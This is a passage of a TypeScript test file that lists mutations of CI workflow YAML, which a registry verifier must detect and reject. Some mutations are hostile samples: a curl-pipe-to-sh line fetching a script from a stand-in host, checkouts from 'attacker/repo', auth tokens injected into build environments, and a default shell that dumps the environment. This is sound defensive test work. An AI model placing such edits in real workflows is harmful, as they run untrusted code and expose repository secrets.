// Workflow mutations shared by the registry tests. Each case edits one real
// workflow text and names a message the verifier must report for it.

export type Edit = (text: string) => string;
export type MutationCase = { name: string; file: string; edit: Edit; needle: string };

export function replaceOnce(text: string, old: string, replacement: string): string {
  const at = text.indexOf(old);
  if (at < 0) throw new Error(`mutation marker not found: ${JSON.stringify(old)}`);
  return text.slice(0, at) + replacement + text.slice(at + old.length);
}

const swap =
  (old: string, replacement: string): Edit =>
  (text) =>
    replaceOnce(text, old, replacement);

function within(start: string, end: string | null, edit: Edit): Edit {
  return (text) => {
    const from = text.indexOf(start);
    if (from < 0) throw new Error(`section marker not found: ${start}`);
    const to = end === null ? text.length : text.indexOf(end, from + start.length);
    if (to < 0) throw new Error(`section end not found: ${String(end)}`);
    return text.slice(0, from) + edit(text.slice(from, to)) + text.slice(to);
  };
}

const GATED = ["rust", "web", "install", "documents", "collab-engine"] as const;
const PHASES =
  "options: [connection, crud, transactions, migration, inventory, reset, persistence, restore, ui-ack, ui-baseline]";
const TARGET_INIT = `          printf 'CARGO_TARGET_DIR=%s/turso-target\\n' "$RUNNER_TEMP" >> "$GITHUB_ENV"\n`;
const UNIT =
  "      - name: Credential-free frozen diagnostic unit (exactly one test)\n" +
  "        run: bun --no-env-file tools/turso/guard.ts --diagnostic-unit\n";
const UNIT_NEEDLE = "credential-free exact frozen diagnostic unit before secret consumption";
const CONSUME = "        run: bun --no-env-file tools/turso/guard.ts --consume\n";
const WEB_GATE =
  '          bun tools/ci/gate.ts --workflow web --needs-json "$NEEDS_JSON" --tested-sha "$TESTED_SHA"\n';
const PLAN_LINE = "          bun tools/ci/plan.ts \\\n";
const PIP =
  "          python3 -m pip install --disable-pip-version-check --user --break-system-packages -r scripts/ci_selection_requirements.txt\n";
const CHECKOUT = "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4\n";
const SETUP_BUN_PIN = "oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6";
const OTHER_PIN = "oven-sh/setup-bun@" + "1".repeat(40);
const SETUP_BUN =
  `      - uses: ${SETUP_BUN_PIN} # v2.2.0\n` +
  "        with:\n" +
  "          bun-version-file: .bun-version\n";
const POSTGRES_MATRIX_LINE =
  "      matrix: ${{ fromJSON(needs.ci-plan.outputs.postgres_matrix) }}\n";

function caseList(): MutationCase[] {
  const cases: MutationCase[] = [];
  const add = (name: string, file: string, edit: Edit, needle: string): void => {
    cases.push({ name, file, edit, needle });
  };

  // Gate wiring (RegistryMutationCliTest).
  const prTypes =
    "    types: [opened, synchronize, reopened, ready_for_review, converted_to_draft]\n";
  const prTrigger: [string, string][] = [
    ["pr-path-filter", `${prTypes}    paths: ['apps/web/**']\n`],
    ["pr-paths-ignore", `${prTypes}    paths-ignore: ['docs/**']\n`],
    ["pr-branch-filter", `${prTypes}    branches: [main]\n`],
    ["pr-no-types", ""],
    ["pr-default-types", "    types: [opened, synchronize, reopened]\n"],
    ["pr-no-converted-to-draft", "    types: [opened, synchronize, reopened, ready_for_review]\n"],
    [
      "pr-extra-type",
      "    types: [opened, synchronize, reopened, ready_for_review, converted_to_draft, edited]\n",
    ],
    [
      "pr-reordered-types",
      "    types: [ready_for_review, opened, synchronize, reopened, converted_to_draft]\n",
    ],
    ["pr-types-string", "    types: opened\n"],
  ];
  for (const [name, replacement] of prTrigger) {
    for (const file of GATED.map((workflow) => `${workflow}.yml`)) {
      add(
        `${name}-${file}`,
        file,
        swap(`  pull_request:\n${prTypes}`, `  pull_request:\n${replacement}`),
        "pull_request must be exactly types: [opened, synchronize, reopened, ready_for_review, converted_to_draft]",
      );
    }
  }
  for (const override of ["ref: attacker-head", "repository: attacker/repo", "fetch-depth: 1"]) {
    add(
      `checkout-${override}`,
      "web.yml",
      swap("          fetch-depth: 0", "          " + override),
      "ci-plan must checkout the event merge",
    );
  }
  add(
    "runner-sha-override",
    "web.yml",
    swap(
      "          GITHUB_EVENT_NAME:",
      "          GITHUB_SHA: attacker-head\n          GITHUB_EVENT_NAME:",
    ),
    "must not override trusted GITHUB_SHA",
  );
  add(
    "new-job",
    "web.yml",
    swap(
      "  web-ci-gate:",
      "\n  new-suite:\n    needs: ci-plan\n    if: needs.ci-plan.outputs.select_new_suite == 'true'\n    runs-on: ubuntu-26.04\n    steps:\n      - run: echo new\n  web-ci-gate:",
    ),
    "unregistered job id new-suite",
  );
  add(
    "gate-suffixed-job",
    "web.yml",
    swap(
      "  web-ci-gate:",
      "\n  sneaky-ci-gate:\n    needs: ci-plan\n    if: needs.ci-plan.outputs.select_sneaky_ci_gate == 'true'\n    runs-on: ubuntu-26.04\n    steps:\n      - run: echo sneaky\n  web-ci-gate:",
    ),
    "unregistered job id sneaky-ci-gate",
  );
  const install: [string, string, string][] = [
    ["        default: false\n", "        default: true\n", "input run_upgrade_smoke_arm must be"],
    ["        type: boolean\n", "        type: string\n", "input run_upgrade_smoke_arm must be"],
    [
      "      run_upgrade_smoke_arm:\n",
      "      upgrade_old:\n        type: string\n      run_upgrade_smoke_arm:\n",
      "workflow_dispatch inputs must be exactly",
    ],
    [
      "  upgrade-smoke-arm64:\n    needs: ci-plan\n    if: needs.ci-plan.outputs.select_upgrade_smoke_arm64 == 'true'\n    runs-on: ubuntu-26.04-arm\n",
      "  upgrade-smoke-arm64:\n    needs: ci-plan\n    if: needs.ci-plan.outputs.select_upgrade_smoke_arm64 == 'true'\n    runs-on: ubuntu-26.04\n",
      "upgrade-smoke-arm64 runs-on must be ubuntu-26.04-arm",
    ],
    [
      "    if: needs.ci-plan.outputs.select_upgrade_smoke_arm64 == 'true'\n",
      "    if: github.event_name == 'workflow_dispatch'\n",
      "upgrade-smoke-arm64 if must be",
    ],
    [
      "    needs: [ci-plan, install-image, install-smoke, backup-restore-smoke, upgrade-smoke-arm64]\n",
      "    needs: [ci-plan, install-smoke, backup-restore-smoke]\n",
      "install-ci-gate needs must be",
    ],
    [
      "      select_upgrade_smoke_arm64: ${{ steps.plan.outputs.select_upgrade_smoke_arm64 }}\n",
      "",
      "missing selector output select_upgrade_smoke_arm64",
    ],
  ];
  install.forEach(([old, replacement, needle], index) => {
    add(`install-opt-in-${String(index)}`, "install.yml", swap(old, replacement), needle);
  });
  add(
    "opt-in-on-other-workflow",
    "web.yml",
    swap(
      "  workflow_dispatch:\n",
      "  workflow_dispatch:\n    inputs:\n      run_upgrade_smoke_arm:\n        type: boolean\n        default: false\n",
    ),
    "web: workflow_dispatch inputs must be exactly []",
  );
  add(
    "missing-selector-output",
    "web.yml",
    swap("      select_web_checks: ${{ steps.plan.outputs.select_web_checks }}\n", ""),
    "missing selector output select_web_checks",
  );
  add(
    "gate-needs-mismatch",
    "web.yml",
    within("  web-ci-gate:", null, (gate) =>
      gate.replace(/ {4}needs:\n {6}\[[^\]]*\]/, "    needs: [ci-plan, web-checks]"),
    ),
    "needs must be ci-plan and every registered job",
  );
  add(
    "swapped-needs-json",
    "rust.yml",
    swap("NEEDS_JSON: ${{ toJSON(needs) }}", "NEEDS_JSON: ${{ toJSON(needs.postgres) }}"),
    "env must be exactly",
  );
  add(
    "forged-needs-json",
    "rust.yml",
    swap("NEEDS_JSON: ${{ toJSON(needs) }}", 'NEEDS_JSON: \'{"fast":{"result":"success"}}\''),
    "env must be exactly",
  );
  add(
    "swapped-tested-sha",
    "rust.yml",
    swap("TESTED_SHA: ${{ github.sha }}", "TESTED_SHA: ${{ needs.fast.result }}"),
    "env must be exactly",
  );
  add(
    "extra-gate-env",
    "rust.yml",
    swap(
      "          TESTED_SHA: ${{ github.sha }}\n",
      "          TESTED_SHA: ${{ github.sha }}\n          JOB_FAST: ${{ needs.postgres.result }}\n",
    ),
    "env must be exactly",
  );
  add(
    "decoy-echo-gate",
    "web.yml",
    swap(WEB_GATE, "          echo " + WEB_GATE.trimStart()),
    "canonical gate invocation",
  );
  add(
    "commented-gate",
    "web.yml",
    swap(WEB_GATE, "          # " + WEB_GATE.trimStart() + "          true\n"),
    "canonical gate invocation",
  );
  add(
    "rust-missing-selector-wrapper",
    "rust.yml",
    swap("          bash scripts/test-ci-selection.sh\n", ""),
    "must run scripts/test-ci-selection.sh",
  );
  add(
    "web-duplicate-selector-wrapper",
    "web.yml",
    swap(
      "          bun tools/ci/plan.ts \\\n",
      "          bash scripts/test-ci-selection.sh\n          bun tools/ci/plan.ts \\\n",
    ),
    "must not duplicate scripts/test-ci-selection.sh",
  );
  for (const workflow of GATED) {
    const file = `${workflow}.yml`;
    const gate = `${workflow}-ci-gate`;
    const inPlan = (edit: Edit): Edit => within("  ci-plan:", "      - id: plan\n", edit);
    const inGate = (edit: Edit): Edit => within(`  ${gate}:`, null, edit);
    const planNeedle = "ci-plan must install pinned Bun from .bun-version once";
    const gateNeedle = `${gate} must install pinned Bun from .bun-version once`;
    const toolchains: [string, string, string][] = [
      [
        "python-plan",
        "          python3 scripts/ci_selection.py plan \\\n",
        "must invoke tools/ci/plan.ts",
      ],
      [
        "pip",
        `${PIP}          bun tools/ci/plan.ts \\\n`,
        "ci-plan must use the canonical plan invocation",
      ],
      [
        "bun-ci",
        "          bun ci\n          bun tools/ci/plan.ts \\\n",
        "ci-plan must use the canonical plan invocation",
      ],
      [
        "bunx",
        "          bunx tsx tools/ci/plan.ts \\\n",
        "ci-plan must use the canonical plan invocation",
      ],
      [
        "npm-ci",
        `          npm ci\n${PLAN_LINE}`,
        "ci-plan must use the canonical plan invocation",
      ],
      ["bun-i", `          bun i\n${PLAN_LINE}`, "ci-plan must use the canonical plan invocation"],
      [
        "curl-sh",
        `          curl -fsSL https://example.invalid/i.sh | sh\n${PLAN_LINE}`,
        "ci-plan must use the canonical plan invocation",
      ],
      [
        "plan-masked",
        "          bun tools/ci/plan.ts || true \\\n",
        "ci-plan must use the canonical plan invocation",
      ],
    ];
    for (const [name, replacement, needle] of toolchains) {
      add(`${workflow}-plan-${name}`, file, swap(PLAN_LINE, replacement), needle);
    }
    add(
      `${workflow}-plan-extra-run-step`,
      file,
      swap("      - id: plan\n", "      - run: python3 -m pip install pyyaml\n      - id: plan\n"),
      "ci-plan must use the canonical plan invocation in its only run step",
    );
    const setups: [string, Edit, Edit][] = [
      ["missing", swap(SETUP_BUN, ""), swap(SETUP_BUN, "")],
      ["sha", swap(SETUP_BUN_PIN, OTHER_PIN), swap(SETUP_BUN_PIN, OTHER_PIN)],
      [
        "version",
        swap("bun-version-file: .bun-version", "bun-version: latest"),
        swap("bun-version-file: .bun-version", "bun-version: latest"),
      ],
      [
        "conditional",
        swap(SETUP_BUN, SETUP_BUN.replace("        with:", "        if: success()\n        with:")),
        swap(SETUP_BUN, SETUP_BUN.replace("        with:", "        if: success()\n        with:")),
      ],
      ["twice", swap(SETUP_BUN, SETUP_BUN + SETUP_BUN), swap(SETUP_BUN, SETUP_BUN + SETUP_BUN)],
      [
        "before-checkout",
        (text) => {
          const checkout = text.slice(text.indexOf(CHECKOUT), text.indexOf(SETUP_BUN));
          return replaceOnce(text, checkout + SETUP_BUN, SETUP_BUN + checkout);
        },
        (text) => replaceOnce(text, CHECKOUT + SETUP_BUN, SETUP_BUN + CHECKOUT),
      ],
    ];
    for (const [name, planEdit, gateEdit] of setups) {
      add(`${workflow}-plan-setup-bun-${name}`, file, inPlan(planEdit), planNeedle);
      add(`${workflow}-gate-setup-bun-${name}`, file, inGate(gateEdit), gateNeedle);
    }
    add(
      `${workflow}-plan-setup-bun-after-plan`,
      file,
      within(
        "  ci-plan:",
        "\n\n",
        (text) => replaceOnce(text, SETUP_BUN, "") + "\n" + SETUP_BUN.trimEnd(),
      ),
      planNeedle,
    );
    add(
      `${workflow}-python-gate`,
      file,
      inGate(
        swap("bun tools/ci/gate.ts --workflow", "python3 scripts/ci_selection.py gate --workflow"),
      ),
      "canonical gate invocation",
    );
    add(
      `${workflow}-gate-pip`,
      file,
      inGate(swap("          bun tools/ci/gate.ts", PIP + "          bun tools/ci/gate.ts")),
      `${gate} must use the canonical gate invocation`,
    );
  }
  for (const workflow of GATED) {
    const file = `${workflow}.yml`;
    add(
      `${workflow}-event-gate-name`,
      file,
      swap(`    name: ${workflow}-ci-gate\n`, "    name: ${{ github.event_name }}-ci-gate\n"),
      `${workflow}-ci-gate name must stay ${workflow}-ci-gate`,
    );
    add(
      `${workflow}-drop-merge-group`,
      file,
      swap("  merge_group:\n    types: [checks_requested]\n", ""),
      "merge_group trigger is required",
    );
    add(
      `${workflow}-filter-merge-group`,
      file,
      swap("types: [checks_requested]", "types: [destroyed]"),
      "merge_group must request checks_requested",
    );
  }

  // Runner labels and cache qualification.
  for (const file of [
    ...GATED.map((workflow) => `${workflow}.yml`),
    "release.yml",
    "turso-test.yml",
  ]) {
    for (const label of ["ubuntu-24.04", "ubuntu-22.04", "ubuntu-latest"]) {
      add(
        `${file}-runner-${label}`,
        file,
        swap("runs-on: ubuntu-26.04", "runs-on: " + label),
        "requires explicit Ubuntu 26.04 runners",
      );
    }
  }
  add(
    "old-os-cache-prefix",
    "collab-engine.yml",
    swap(
      "restore-keys: v1-collab-engine-ubuntu-26.04-",
      "restore-keys: v1-collab-engine-ubuntu-24.04-",
    ),
    "cache restore-keys must bind Ubuntu 26.04",
  );
  for (const family of ["restore", "save"]) {
    add(
      `separate-cache-family-${family}`,
      "rust.yml",
      within("      - name: Restore Cargo downloads\n", "      - name:", (step) =>
        step
          .replace("uses: actions/cache@", `uses: actions/cache/${family}@`)
          .replace(/key: v2-cargo-server-[^\n]*/, "key: unqualified-downloads"),
      ),
      "cache key must bind Ubuntu 26.04, architecture and toolchain",
    );
  }

  // Release and image token scopes.
  add(
    "release-pull-request",
    "release.yml",
    swap("  workflow_dispatch:", "  pull_request:\n  workflow_dispatch:"),
    "release.yml: triggers must be exactly push (tags) and workflow_dispatch",
  );
  add(
    "release-verify-writes",
    "release.yml",
    swap(
      "      contents: read\n      checks: read\n",
      "      contents: write\n      checks: read\n",
    ),
    "release.yml: verify may not write ['contents']",
  );
  add(
    "release-per-tag-concurrency",
    "release.yml",
    swap("  group: release-ghcr-fvoci\n", "  group: release-${{ github.ref_name }}\n"),
    "release.yml: concurrency must be one fixed group with cancel-in-progress: false",
  );
  add(
    "release-publish-writes-contents",
    "release.yml",
    within(
      "  publish:\n    needs: [verify, index, smoke]\n",
      null,
      swap("      packages: write\n", "      contents: write\n      packages: write\n"),
    ),
    "release.yml: publish may not write ['contents']",
  );
  add(
    "release-branch-push",
    "release.yml",
    swap("    tags:", "    branches: [main]\n    tags:"),
    "release.yml: push must list only v0.* tags",
  );
  for (const [job, scope] of [
    ["build", "packages"],
    ["push", "issues"],
    ["push", "contents"],
    ["push-manifest", "contents"],
    ["push-manifest", "issues"],
  ] as const) {
    add(
      `ci-base-${job}-${scope}`,
      "ci-base-image.yml",
      (text) => {
        const jobAt = text.indexOf(`  ${job}:\n`, text.indexOf("jobs:\n"));
        if (job === "build") {
          const at = jobAt + `  ${job}:\n`.length;
          return text.slice(0, at) + `    permissions:\n      ${scope}: write\n` + text.slice(at);
        }
        const at = text.indexOf("    permissions:\n", jobAt) + "    permissions:\n".length;
        let rest = text.slice(at);
        if (scope === "contents") rest = rest.replace("      contents: read\n", "");
        return text.slice(0, at) + `      ${scope}: write\n` + rest;
      },
      `ci-base-image.yml: ${job} may not write ['${scope}']`,
    );
  }

  // Turso manual workflow.
  const turso: [string, string, string][] = [
    ["  workflow_dispatch:\n", "  pull_request_target:\n", "manual dispatch only"],
    ["      destructive:\n", "      checkout_sha:\n", "fixed phase inputs"],
    ["default: connection", "default: migration", "fixed phase inputs"],
    ["default: false", "default: true", "fixed phase inputs"],
    [
      "Connection, inventory and ui-baseline read-only; migration, reset and ui-ack require both destructive gates; others NOT IMPLEMENTED",
      "All phases implemented",
      "fixed phase inputs",
    ],
    ["  contents: read\n", "  contents: write\n", "contents read only"],
    ["  cancel-in-progress: false\n", "  cancel-in-progress: true\n", "fixed database concurrency"],
    [
      "github.repository == 'AISFlow/fvoci'",
      "github.repository == 'attacker/fvoci'",
      "trusted admission",
    ],
    [
      "ref: ${{ github.sha }}",
      "ref: ${{ inputs.checkout_sha }}",
      "pre-Environment admission steps",
    ],
    ["persist-credentials: false", "persist-credentials: true", "pre-Environment admission steps"],
    ["    needs: admission\n", "    needs: []\n", "runtime needs successful trusted admission"],
    ["    environment: fvoci-turso-test\n", "    environment: production\n", "fixed Environment"],
    [" --admit\n", " --consume\n", "pre-Environment admission steps"],
    ["--no-run --message-format=json", "--message-format=json", "fixed fresh compilation"],
    [
      "      CARGO_INCREMENTAL: 0\n",
      "      TOKEN: ${{ secrets.FVOCI_TEST_TURSO_AUTH_TOKEN }}\n",
      "credential-free compiler environment",
    ],
    [" --consume\n", " --consume || true\n", "only one sanitized runtime step"],
    [
      "branches: [fvoci/v060-turso-verified-connection]",
      "branches: ['*']",
      "fixed credential-free bootstrap",
    ],
    [
      "    if: github.event_name == 'workflow_dispatch'",
      "    if: github.event_name == 'push'",
      "runtime needs successful trusted admission",
    ],
    [
      "      CARGO_INCREMENTAL: 0\n",
      "      CARGO_INCREMENTAL: 0\n      CARGO_TARGET_DIR: ${{ runner.temp }}/turso-target\n",
      "credential-free compiler environment",
    ],
    [TARGET_INIT, "", "maintained pinned compiler/native preparation"],
    [
      TARGET_INIT,
      TARGET_INIT.replace("$RUNNER_TEMP", "/foreign"),
      "maintained pinned compiler/native preparation",
    ],
    [
      TARGET_INIT + "          rustup toolchain install 1.98.1 --profile minimal\n",
      "          rustup toolchain install 1.98.1 --profile minimal\n" + TARGET_INIT,
      "maintained pinned compiler/native preparation",
    ],
  ];
  turso.forEach(([old, replacement, needle], index) => {
    add(`turso-boundary-${String(index)}`, "turso-test.yml", swap(old, replacement), needle);
  });

  const bunCache = `            printf 'BUN_INSTALL_CACHE_DIR=%s/turso-bun-cache\\n' "$RUNNER_TEMP"\n`;
  const browserCache = `            printf 'PLAYWRIGHT_BROWSERS_PATH=%s/turso-browsers\\n' "$RUNNER_TEMP"\n`;
  const exported = '          } >> "$GITHUB_ENV"\n';
  const ui: [string, string][] = [
    ["    needs: admission\n", "    needs: []\n"],
    ["github.event.inputs.phase == 'ui-ack'", "github.event.inputs.phase != 'ui-ack'"],
    ["github.repository == 'AISFlow/fvoci'", "github.repository == 'attacker/fvoci'"],
    ["github.ref == 'refs/heads/main'", "startsWith(github.ref, 'refs/heads/')"],
    ["    environment: fvoci-turso-test\n", "    environment: production\n"],
    ["    timeout-minutes: 40\n", "    timeout-minutes: 90\n"],
    ["      FVOCI_BUILD_SHA: ${{ github.sha }}\n", "      FVOCI_BUILD_SHA: stale9202\n"],
    ["      CARGO_BUILD_JOBS: 2\n", "      CARGO_BUILD_JOBS: 12\n"],
    ["      CARGO_INCREMENTAL: 0\n", "      TOKEN: ${{ secrets.FVOCI_TEST_TURSO_AUTH_TOKEN }}\n"],
    [
      "      CARGO_PROFILE_TEST_DEBUG: 0\n",
      "      CARGO_PROFILE_TEST_DEBUG: 0\n      BUN_INSTALL_CACHE_DIR: ${{ runner.temp }}/turso-bun-cache\n",
    ],
    [
      "      CARGO_PROFILE_TEST_DEBUG: 0\n",
      "      CARGO_PROFILE_TEST_DEBUG: 0\n      PLAYWRIGHT_BROWSERS_PATH: ${{ runner.temp }}/turso-browsers\n",
    ],
    [bunCache, ""],
    [browserCache, ""],
    [bunCache, bunCache.replace("$RUNNER_TEMP", "/foreign")],
    [exported, exported.replace("$GITHUB_ENV", "$GITHUB_OUTPUT")],
    [browserCache + exported, exported + browserCache],
    ["          ref: ${{ github.sha }}\n", "          ref: main\n"],
    ["          persist-credentials: false\n", "          persist-credentials: true\n"],
    ["          cargo fetch --locked\n", "          cargo fetch\n"],
    ["          cargo fetch --locked --manifest-path crates/collab-engine/Cargo.toml\n", ""],
    [
      "          cargo fetch --locked --manifest-path crates/collab-engine/Cargo.toml\n",
      "          cargo fetch --manifest-path crates/collab-engine/Cargo.toml\n",
    ],
    [
      "          cargo fetch --locked --manifest-path crates/collab-engine/Cargo.toml\n",
      "          cargo fetch --locked --manifest-path Cargo.toml\n",
    ],
    ["          bun-version: 1.4.2\n", "          bun-version: latest\n"],
    ["          bun install --frozen-lockfile\n", "          bun install\n"],
    ["          bun --no-env-file tools/turso/ui.ts --record-before\n", ""],
    [
      "          bun --bun run --cwd apps/web build\n",
      "          cp -r /stale9202/dist apps/web/dist\n",
    ],
    ["          bun --bun run --cwd apps/web build\n", "          bun run --cwd apps/web build\n"],
    ["--features api-schema,db-tests --jobs 2", "--features db-tests --jobs 2"],
    ["--features worker --jobs 2", "--jobs 2"],
    ["          bun --no-env-file tools/turso/ui.ts --freeze\n", ""],
    [
      "      - name: Actual current primary UI baseline or guarded ON restart OFF consumer\n",
      "      - name: Actual current primary UI baseline or guarded ON restart OFF consumer\n        if: false\n",
    ],
    ["${{ vars.FVOCI_TEST_TURSO_ALLOW_DESTRUCTIVE }}", "true"],
    ["${{ secrets.FVOCI_TEST_TURSO_AUTH_TOKEN }}", "${{ secrets.PRODUCTION_TOKEN }}"],
    [CONSUME, "        run: bun --no-env-file tools/turso/ui.ts --actor\n"],
  ];
  ui.forEach(([old, replacement], index) => {
    add(
      `turso-ui-${String(index)}`,
      "turso-test.yml",
      within("  turso-ui:\n", null, swap(old, replacement)),
      "fixed private Turso UI job and current source baseline consumer",
    );
  });
  add(
    "turso-ui-extra-step",
    "turso-test.yml",
    (text) => text + "    extra-step: {uses: actions/upload-artifact@v4}\n",
    "fixed private Turso UI job and current source baseline consumer",
  );

  // Turso tools run on the pinned Bun: no Python runtime comes back, no job
  // loses its Bun, and the tools never read a .env file.
  const ADMISSION_NEEDLE = "pre-Environment admission steps";
  const CONNECTION_NEEDLE = "fixed credential-free build then single consuming step";
  const UI_NEEDLE = "fixed private Turso UI job and current source baseline consumer";
  const PYTHON_NEEDLE = "turso-test.yml: text: no Python runtime, package or environment";
  const TURSO_SETUP_BUN =
    "      # Setup action is pinned to the same maintained Web CI revision.\n" +
    "      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6\n" +
    "        with:\n          bun-version: 1.4.2\n";
  const guardTool = "bun --no-env-file tools/turso/guard.ts";
  const uiTool = "bun --no-env-file tools/turso/ui.ts";
  const oldGuard = "python3 scripts/selected-backend-ci/turso-test-guard.py";
  const oldUi = "python3 scripts/selected-backend-ci/turso-ui.py";
  // Each job-specific case edits only its own job, so a line that another job
  // also has cannot be hit instead.
  const JOBS = {
    admission: ["  admission:\n", "  turso-connection:\n"],
    "turso-connection": ["  turso-connection:\n", "  turso-ui:\n"],
    "turso-ui": ["  turso-ui:\n", null],
  } as const;
  type RuntimeCase = {
    name: string;
    job: keyof typeof JOBS | null;
    old: string;
    replacement: string;
    needle: string;
  };
  const runtime: RuntimeCase[] = [
    {
      name: "fixtures-python",
      job: "admission",
      old: "bun --no-env-file tools/turso/fixtures.ts",
      replacement: "python3 scripts/selected-backend-ci/turso-test-fixtures.py",
      needle: ADMISSION_NEEDLE,
    },
    {
      name: "admit-python",
      job: "admission",
      old: `${guardTool} --admit`,
      replacement: `${oldGuard} --admit`,
      needle: ADMISSION_NEEDLE,
    },
    {
      name: "admit-env-file",
      job: "admission",
      old: `${guardTool} --admit`,
      replacement: "bun tools/turso/guard.ts --admit",
      needle: ADMISSION_NEEDLE,
    },
    {
      name: "freeze-python",
      job: "turso-connection",
      old: `${guardTool} --freeze`,
      replacement: `${oldGuard} --freeze`,
      needle: "fixed fresh compilation",
    },
    {
      name: "unit-python",
      job: "turso-connection",
      old: `${guardTool} --diagnostic-unit`,
      replacement: `${oldGuard} --diagnostic-unit`,
      needle: UNIT_NEEDLE,
    },
    {
      name: "consume-python",
      job: "turso-connection",
      old: `${guardTool} --consume`,
      replacement: `${oldGuard} --consume`,
      needle: "only one sanitized runtime step",
    },
    {
      name: "ui-record-python",
      job: "turso-ui",
      old: `${uiTool} --record-before`,
      replacement: `${oldUi} --record-before`,
      needle: UI_NEEDLE,
    },
    {
      name: "ui-freeze-python",
      job: "turso-ui",
      old: `${uiTool} --freeze`,
      replacement: `${oldUi} --freeze`,
      needle: UI_NEEDLE,
    },
    {
      name: "ui-freeze-env-file",
      job: "turso-ui",
      old: `${uiTool} --freeze`,
      replacement: "bun tools/turso/ui.ts --freeze",
      needle: UI_NEEDLE,
    },
    {
      name: "ui-consume-python",
      job: "turso-ui",
      old: `${guardTool} --consume`,
      replacement: `${oldGuard} --consume`,
      needle: UI_NEEDLE,
    },
    {
      name: "connection-apt-python",
      job: "turso-connection",
      old: "--no-install-recommends gcc",
      replacement: "--no-install-recommends python3 gcc",
      needle: "maintained pinned compiler/native preparation",
    },
    {
      name: "ui-apt-python",
      job: "turso-ui",
      old: "--no-install-recommends gcc",
      replacement: "--no-install-recommends python3 gcc",
      needle: UI_NEEDLE,
    },
    {
      name: "ui-env-python",
      job: "turso-ui",
      old: "      CARGO_PROFILE_TEST_DEBUG: 0\n",
      replacement: "      CARGO_PROFILE_TEST_DEBUG: 0\n      PYTHONDONTWRITEBYTECODE: '1'\n",
      needle: UI_NEEDLE,
    },
    {
      name: "python-comment",
      job: null,
      old: "\njobs:\n",
      replacement: "\n# python3 is no longer needed\njobs:\n",
      needle: PYTHON_NEEDLE,
    },
    {
      name: "admission-no-bun",
      job: "admission",
      old: TURSO_SETUP_BUN,
      replacement: "",
      needle: ADMISSION_NEEDLE,
    },
    {
      name: "connection-no-bun",
      job: "turso-connection",
      old: TURSO_SETUP_BUN,
      replacement: "",
      needle: CONNECTION_NEEDLE,
    },
    {
      name: "admission-bun-latest",
      job: "admission",
      old: "          bun-version: 1.4.2\n",
      replacement: "          bun-version: latest\n",
      needle: ADMISSION_NEEDLE,
    },
    {
      name: "connection-bun-latest",
      job: "turso-connection",
      old: "          bun-version: 1.4.2\n",
      replacement: "          bun-version: latest\n",
      needle: "pinned Bun before the guard runs",
    },
    {
      name: "admission-bun-tag",
      job: "admission",
      old: "oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6",
      replacement: "oven-sh/setup-bun@v2",
      needle: ADMISSION_NEEDLE,
    },
    {
      name: "connection-bun-tag",
      job: "turso-connection",
      old: "oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6",
      replacement: "oven-sh/setup-bun@v2",
      needle: "pinned Bun before the guard runs",
    },
  ];
  for (const { name, job, old, replacement, needle } of runtime) {
    const edit = swap(old, replacement);
    add(`turso-bun-${name}`, "turso-test.yml", job ? within(...JOBS[job], edit) : edit, needle);
  }
  const inputs: [string, string][] = [
    ["      ui_source_sha:\n", "      arbitrary_source:\n"],
    ["      ui_baseline_sha256:\n", "      arbitrary_dataset:\n"],
    ["      ui_target_sha256:\n", "      arbitrary_target:\n"],
    [PHASES, PHASES.replace(", ui-baseline", "")],
    [PHASES, PHASES.replace(", inventory", "")],
    [PHASES, PHASES.replace("inventory", "unapproved-phase")],
    [PHASES, PHASES.replace("inventory", "inventory, unapproved-phase")],
    [PHASES, PHASES.replace("inventory", "inventory, inventory")],
    [PHASES, PHASES.replace("migration, inventory", "inventory, migration")],
    [PHASES, PHASES.replace(", reset", "")],
    [PHASES, PHASES.replace("reset", "unapproved-phase")],
    [PHASES, PHASES.replace("reset", "reset, reset")],
    [PHASES, PHASES.replace("reset", "reset, unapproved-phase")],
  ];
  inputs.forEach(([old, replacement], index) => {
    add(
      `turso-inputs-${String(index)}`,
      "turso-test.yml",
      swap(old, replacement),
      "turso-test.yml: fixed phase inputs and non-destructive default",
    );
  });
  const unit: [string, string][] = [
    ["", "fixed credential-free build then single consuming step"],
    [UNIT + UNIT, "fixed credential-free build then single consuming step"],
    [UNIT.replace("--diagnostic-unit", "--consume"), UNIT_NEEDLE],
    [UNIT.replace("--diagnostic-unit", "--diagnostic-unit --ignored"), UNIT_NEEDLE],
    [UNIT.replace("--diagnostic-unit", "--diagnostic-unit || true"), UNIT_NEEDLE],
    [UNIT.replace("frozen diagnostic unit", "arbitrary unit"), UNIT_NEEDLE],
    [
      UNIT.replace(
        "        run:",
        "        env:\n          TOKEN: ${{ secrets.FVOCI_TEST_TURSO_AUTH_TOKEN }}\n        run:",
      ),
      UNIT_NEEDLE,
    ],
    [
      UNIT.replace("        run:", "        env:\n          EXTRA: value\n        run:"),
      UNIT_NEEDLE,
    ],
    [UNIT.replace("        run:", "        if: false\n        run:"), UNIT_NEEDLE],
  ];
  unit.forEach(([replacement, needle], index) => {
    add(`turso-unit-${String(index)}`, "turso-test.yml", swap(UNIT, replacement), needle);
  });
  add(
    "turso-unit-before-compile",
    "turso-test.yml",
    (text) => {
      const marker = "      - name: Credential-free current library test compilation\n";
      return replaceOnce(replaceOnce(text, UNIT, ""), marker, UNIT + marker);
    },
    UNIT_NEEDLE,
  );
  add(
    "turso-unit-after-secret",
    "turso-test.yml",
    (text) => replaceOnce(replaceOnce(text, UNIT, ""), CONSUME, CONSUME + UNIT),
    UNIT_NEEDLE,
  );
  add(
    "turso-target-init-moved",
    "turso-test.yml",
    (text) =>
      replaceOnce(
        replaceOnce(text, TARGET_INIT, ""),
        "          cargo test --locked",
        TARGET_INIT + "          cargo test --locked",
      ),
    "maintained pinned compiler/native preparation",
  );

  // Unfiltered gate triggers, SHA pins, permission pins, check names, postgres matrix.
  add(
    "turso-top-level-defaults",
    "turso-test.yml",
    swap("\njobs:\n", "\ndefaults:\n  run:\n    shell: bash -c 'env; bash {0}'\njobs:\n"),
    "turso-test.yml: no top-level defaults, run-name or other workflow keys",
  );
  add(
    "rust-push-paths",
    "rust.yml",
    swap(
      "  push:\n    branches: [main]\n",
      "  push:\n    branches: [main]\n    paths: ['src/**']\n",
    ),
    "rust.yml: push must not use paths",
  );
  add(
    "documents-push-paths-ignore",
    "documents.yml",
    swap(
